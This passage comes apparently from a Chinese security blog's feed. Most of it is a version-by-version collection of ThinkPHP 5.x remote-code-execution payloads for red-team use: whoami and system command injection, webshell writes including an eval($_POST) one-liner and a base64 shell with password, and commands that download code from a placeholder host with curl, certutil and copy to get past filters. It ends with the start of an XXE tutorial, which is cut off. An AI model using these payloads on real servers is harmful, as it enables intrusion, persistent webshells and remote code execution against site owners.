请加上完整路径</code></pre><p>5、var_dump函数，可以查看该路径下的文件，文件夹</p><pre><code>s=var_dump(scandir(&#39;../application/&#39;))&amp;_method=__construct&amp;filter=assert</code></pre><p>6、复制文件</p><pre><code>s=copy(&quot;/data/wwwroot/data.tar&quot;, &quot;/data/wwwroot/test.com/public/data.tar&quot;)&amp;_method=__construct&amp;filter=asser</code></pre><h3 id="Thinkphp-5-0-2"><a href="#Thinkphp-5-0-2" class="headerlink" title="Thinkphp 5.0.2"></a>Thinkphp 5.0.2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-3"><a href="#Thinkphp-5-0-3" class="headerlink" title="Thinkphp 5.0.3"></a>Thinkphp 5.0.3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-4"><a href="#Thinkphp-5-0-4" class="headerlink" title="Thinkphp 5.0.4"></a>Thinkphp 5.0.4</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-5"><a href="#Thinkphp-5-0-5" class="headerlink" title="Thinkphp 5.0.5"></a>Thinkphp 5.0.5</h3><p>waf对eval进行了拦截</p><p>禁止了assert函数对eval函数后面的括号进行了正则过滤</p><p>对file_get_contents函数后面的括号进行了正则过滤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">http://test.com/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=</span><span class="php"><span class="meta">&lt;?php</span> <span class="comment">/*1111*/</span><span class="comment">/***/</span>file_put_contents<span class="comment">/*1**/</span>(<span class="comment">/***/</span><span class="string">&#x27;index11.php&#x27;</span><span class="comment">/**/</span>,file_get_contents(<span class="comment">/**/</span><span class="string">&#x27;https://www.hack.com/xxx.js&#x27;</span>))<span class="comment">/**/</span>;<span class="comment">/**/</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-6"><a href="#Thinkphp-5-0-6" class="headerlink" title="Thinkphp 5.0.6"></a>Thinkphp 5.0.6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-7"><a href="#Thinkphp-5-0-7" class="headerlink" title="Thinkphp 5.0.7"></a>Thinkphp 5.0.7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-8"><a href="#Thinkphp-5-0-8" class="headerlink" title="Thinkphp 5.0.8"></a>Thinkphp 5.0.8</h3><pre><code>http://test.com/public_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1c=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写入文件</p></blockquote><pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=uploads/1.php&amp;vars[1][]=&lt;?php ?&gt;</code></pre><blockquote><p>直接用菜刀连</p></blockquote><pre><code>http://test.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</code></pre><blockquote><p>getshell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="Thinkphp-5-0-9"><a href="#Thinkphp-5-0-9" class="headerlink" title="Thinkphp 5.0.9"></a>Thinkphp 5.0.9</h3><blockquote><p>test.com/?s=index/index</p></blockquote><pre><code>POSTs=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=asser</code></pre><h3 id="Thinkphp-5-0-10"><a href="#Thinkphp-5-0-10" class="headerlink" title="Thinkphp 5.0.10"></a>Thinkphp 5.0.10</h3><p>post提交</p><pre><code>http://test.com/public/index.php?s=index/index/indexs=whoami&amp;_method=__construct&amp;method&amp;filter[]=syste</code></pre><h3 id="Thinkphp-5-0-11"><a href="#Thinkphp-5-0-11" class="headerlink" title="Thinkphp 5.0.11"></a>Thinkphp 5.0.11</h3><pre><code>http://test.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.ph</code></pre><h3 id="Thinkphp-5-0-12"><a href="#Thinkphp-5-0-12" class="headerlink" title="Thinkphp 5.0.12"></a>Thinkphp 5.0.12</h3><blockquote><p>test.com/?s=index/index</p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="Thinkphp-5-0-13"><a href="#Thinkphp-5-0-13" class="headerlink" title="Thinkphp 5.0.13"></a>Thinkphp 5.0.13</h3><blockquote><p>post提交</p></blockquote><pre><code>test.com/?s=index/indexs=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><p>补充</p><blockquote><p>有captcha路由时无需debug=true</p><p><a href="http://test.com/?s=captcha/calc">http://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-14"><a href="#Thinkphp-5-0-14" class="headerlink" title="Thinkphp 5.0.14"></a>Thinkphp 5.0.14</h3><p>1、常规命令</p><pre><code>?s=index/think\app/invokefunction&amp;function=&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php.jpg&amp;vars[1][]=%3C?php%20phpinfo();?3E</code></pre><p>2、eval（&#39;&#39;）和assert（&#39;&#39;）被拦截，命令函数被禁止</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));</code></pre><p>3、基于php7.2环境下</p><pre><code>http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.txt&amp;vars[1][1]=1http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index111.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;写进去发现转义了尖括号</code></pre><p>4、通过copy函数</p><pre><code> http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=112233.ph</code></pre><h3 id="Thinkphp-5-0-15"><a href="#Thinkphp-5-0-15" class="headerlink" title="Thinkphp 5.0.15"></a>Thinkphp 5.0.15</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>有captcha路由时无需debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-16"><a href="#Thinkphp-5-0-16" class="headerlink" title="Thinkphp 5.0.16"></a>Thinkphp 5.0.16</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>有captcha路由时无需debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><blockquote><p>写shell</p></blockquote><pre><code>posts=file_put_contents(&#39;/绝对路径/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert    密码aaaa</code></pre><blockquote><p>直接菜刀连</p></blockquote><pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</code></pre><h3 id="Thinkphp-5-0-17"><a href="#Thinkphp-5-0-17" class="headerlink" title="Thinkphp 5.0.17"></a>Thinkphp 5.0.17</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>有captcha路由时无需debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-18"><a href="#Thinkphp-5-0-18" class="headerlink" title="Thinkphp 5.0.18"></a>Thinkphp 5.0.18</h3><p>1、windows</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][0]=1http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo()</code></pre><p>2、使用certutil</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=passthru&amp;vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php</code></pre><p>由于根目录没写权限，所</p><h3 id="Thinkphp-5-0-19"><a href="#Thinkphp-5-0-19" class="headerlink" title="Thinkphp 5.0.19"></a>Thinkphp 5.0.19</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>有captcha路由时无需debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-20"><a href="#Thinkphp-5-0-20" class="headerlink" title="Thinkphp 5.0.20"></a>Thinkphp 5.0.20</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>写shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>有captcha路由时无需debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-21"><a href="#Thinkphp-5-0-21" class="headerlink" title="Thinkphp 5.0.21"></a>Thinkphp 5.0.21</h3><p>1、poc</p><pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>2、poc</p><pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>3、poc</p><pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=system(&quot;whoami&quot;);</code></pre><p>4、poc</p><pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=eval($_POST[ian])</code></pre><h3 id="Thinkphp-5-0-22"><a href="#Thinkphp-5-0-22" class="headerlink" title="Thinkphp 5.0.22"></a>Thinkphp 5.0.22</h3><p>1、poc</p><pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>2、poc</p><pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=</code></pre><h3 id="Thinkphp-5-0-23"><a href="#Thinkphp-5-0-23" class="headerlink" title="Thinkphp 5.0.23"></a>Thinkphp 5.0.23</h3><pre><code>POST /index.php?s=captcha HTTP/1.1Host: yuoripAccept-Encoding: gzip, deflateAccept: */* Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h3 id="Thinkphp-5-1-18"><a href="#Thinkphp-5-1-18" class="headerlink" title="Thinkphp 5.1.18"></a>Thinkphp 5.1.18</h3><p>1、常规poc</p><pre><code>http://www.xxxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index_bak2.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;</code></pre><p>2、所有目录都无写入权限,base64函数被拦截</p><pre><code> http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1]</code></pre><h3 id="Thinkphp-5-1-29"><a href="#Thinkphp-5-1-29" class="headerlink" title="Thinkphp 5.1.29"></a>Thinkphp 5.1.29</h3><p>1、代码执行</p><pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>2、命令执行</p><pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</code></pre><p>3、文件写入</p><pre><code>http://test.com/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3Ehttp://test.com/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3</code></pre><p>以上资源来源与互联网，如有侵权，请邮箱联系我，及时删除。</p><p><a href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12203534.html">https://www.cnblogs.com/AtesetEnginner/p/12203534.html</a></p>]]></content>
    
    
    <summary type="html">ThinkPHP 3.x ，5.x 漏洞相关的RCE，只包含命令执行POC或者EXP。</summary>
    
    
    
    <category term="红队打点" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/"/>
    
    
    <category term="RCE" scheme="https://fz1lin.com/tags/RCE/"/>
    
    <category term="ThinkPHP" scheme="https://fz1lin.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>代码审计-xxe漏洞</title>
    <link href="https://fz1lin.com/2022/2636630250/"/>
    <id>https://fz1lin.com/2022/2636630250/</id>
    <published>2022-01-03T02:22:31.000Z</published>
    <updated>2022-01-03T02:40:51.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-XXE-概述"><a href="#0x01-XXE-概述" class="headerlink" title="0x01 XXE 概述"></a>0x01 XXE 概述</h2><p>XXE（XML External Entity）即 XML 外部实体注入，是针对使用 XML 标准语言交互的 Web 应用攻击，由于 XML 文档结构的 DTD 在引用外部实体时，未对外部实体进行敏感字符过滤或过滤不严谨，造成了该漏洞类型的产生。</p><h3 id="1-XML-基础"><a href="#1-XML-基础" class="headerlink" title="1.XML 基础"></a>1.XML 基础</h3><p>XML是具有结构性的可扩展标记语言，是用来传输/保存数据而不是现实数据的，在配置文件（Struts，Sprint）、文档结构说明（如本博客的RSS）应用比较多。</p><p>XML 设计宗旨是传输数据，而非显示数据，各种应用程序之间数据传输中最常用的工具。</p><h3 id="2-XML-结构"><a href="#2-XML-结构" class="headerlink" title="2.XML 结构"></a>2.XML 结构</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XML <span class="comment">//文档声明，在文档的第一行</span></span><br><span class="line">XML <span class="comment">//文档类型定义，即DTD，XXE 漏洞所在的地方</span></span><br><span class="line">XML <span class="comment">//文档元素     </span></span><br></pre></td></tr></table></figure><p><img src="/2022/2636630250/image-20220103094629033.png" alt="image-20220103094629033"> </p><h3 id="3-XML-DTD（文档类型定义）"><a href="#3-XML-DTD（文档类型定义）" class="headerlink" title="3.XML DTD（文档类型定义）"></a>3.XML DTD（文档类型定义）</h3><p>文档类型定义（DTD）可以是内部声明也可以引用外部 DTD</p><p>内部声明 DTD 格式：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>引用外部 DTD 格式：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>在DTD中进行实体声明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通稳定或特殊字符的快捷方式的变量。实体可在内部或外部进行声明</p><p>内部声明实体格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>引用外部实体格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</code></p><h3 id="4-外部实体支持协议"><a href="#4-外部实体支持协议" class="headerlink" title="4.外部实体支持协议"></a>4.外部实体支持协议</h3><p>引用外部实体支持协议</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>file<br>http<br>https<br>ftp</td></tr></tbody></table><p>PHP支持的扩展协议</p><table><thead><tr><th>Scheme</th><th>Extension Required</th></tr></thead><tbody><tr><td>https<br>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h3 id="5-Blind-XXE"><a href="#5-Blind-XXE" class="headerlink" title="5.Blind XXE"></a>5.Blind XXE</h3><p>Blind XXE 即服务器无回显是，可以采用 Blind XXE（盲注 XXE），主要使用了 DTD 中的参数实体和内部实体，参数实体是只能在DTD中定义和使用的实体，以 %为标志定义，定义和使用方法，内部实体是指在一个实体中定义的另一个实体，实体之间相互进行对外实体的包容，即俗称的嵌套实体。</p><h2 